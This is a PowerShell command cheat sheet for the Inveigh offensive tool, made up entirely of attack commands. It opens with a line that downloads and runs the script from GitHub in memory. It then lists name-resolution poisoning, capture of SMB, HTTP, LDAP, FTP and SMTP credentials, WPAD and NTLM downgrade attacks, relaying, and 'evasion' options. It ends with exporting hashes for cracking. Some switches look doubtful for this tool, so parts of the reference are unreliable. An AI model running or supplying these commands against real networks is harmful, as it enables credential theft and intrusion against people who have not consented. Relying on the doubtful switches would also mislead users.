```powershell
## INSTALLATION & SETUP
# Install from GitHub
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')

# Import module
Import-Module .\Inveigh.ps1

## CORE POISONING ATTACKS
# Basic LLMNR/NBT-NS poisoning
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y

# Full protocol poisoning (LLMNR/NBT-NS/mDNS/DNS)
Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -DNS Y -ConsoleOutput Y

# Targeted poisoning (single IP/host)
Invoke-Inveigh -LLMNR Y -RepeatTarget 192.168.1.100

## CREDENTIAL CAPTURE
# SMB authentication capture
Invoke-Inveigh -SMB Y -SMBPort 445

# HTTP authentication capture
Invoke-Inveigh -HTTP Y -HTTPPort 80 -HTTPAuth NTLM

# LDAP/S authentication capture
Invoke-Inveigh -LDAP Y -LDAPPort 389 -LDAPAuth NTLM

# WPAD proxy attack
Invoke-Inveigh -WPAD Y -WPADIP 192.168.1.10 -WPADPort 80

## ADVANCED ATTACKS
# Machine account hash capture
Invoke-Inveigh -MachineAccounts Y -LLMNR Y

# Kerberos AS-REQ capture
Invoke-Inveigh -Kerberos Y -ConsoleOutput Y

# SMB session hijacking (requires elevation)
Invoke-Inveigh -SMB Y -SMBSessionHijack Y

# NTLM downgrade attack
Invoke-Inveigh -Challenge 1122334455667788 -NTLMv1 Y

## EVASION TECHNIQUES
# Passive monitoring only
Invoke-Inveigh -Tool 2 -ConsoleOutput Y

# Selective response timing
Invoke-Inveigh -LLMNR Y -ResponseDelay 500

# Spoofing with custom hostnames
Invoke-Inveigh -LLMNR Y -SpooferHosts @("fileserver","sharepoint")

## OUTPUT MANAGEMENT
# Save output to files
Invoke-Inveigh -FileOutput Y -OutputFolder C:\logs -StatusOutput Y

# Real-time console filtering
Invoke-Inveigh -ConsoleOutput Y -ConsoleStatus Y -ConsoleUnique Y

# View captured data
Get-Inveigh -Cleartext       # Show captured plaintext
Get-Inveigh -NTLMv1          # Show NTLMv1 hashes
Get-Inveigh -NTLMv2          # Show NTLMv2 hashes
Get-Inveigh -Kerberos        # Show Kerberos tickets
Get-Inveigh -Sessions        # Show captured SMB sessions

## POST-CAPTURE ACTIONS
# Export captured data
Export-Inveigh -All -OutputFile C:\capture.txt

# Clear captured data from memory
Clear-Inveigh

## TUNING & TROUBLESHOOTING
# Set memory limit (MB)
Invoke-Inveigh -MemoryLimit 500

# Enable debug output
Invoke-Inveigh -Debug Y

# View current settings
Get-Inveigh -Settings

## INTEGRATION WITH OTHER TOOLS
# Pipe NTLM hashes to file for cracking
Get-Inveigh -NTLMv2 | Out-File hashes.txt

# Combine with ntlmrelayx
Invoke-Inveigh -SMB Y -SMBRelayTarget 192.168.1.50

# Use with Metasploit
Invoke-Inveigh -HTTP Y -HTTPPort 8080 -Metasploit Y

## DEFENSE EVASION
# Randomize host responses
Invoke-Inveigh -LLMNR Y -SpooferIPsRandom Y

# Limit attack duration
Invoke-Inveigh -LLMNR Y -RunTime 10

## SPECIAL SCENARIOS
# IPv6 poisoning
Invoke-Inveigh -IPv6 Y -LLMNRv6 Y

# Capture FTP credentials
Invoke-Inveigh -FTP Y -FTPPort 21

# Capture SMTP credentials
Invoke-Inveigh -SMTP Y -SMTPPort 25
```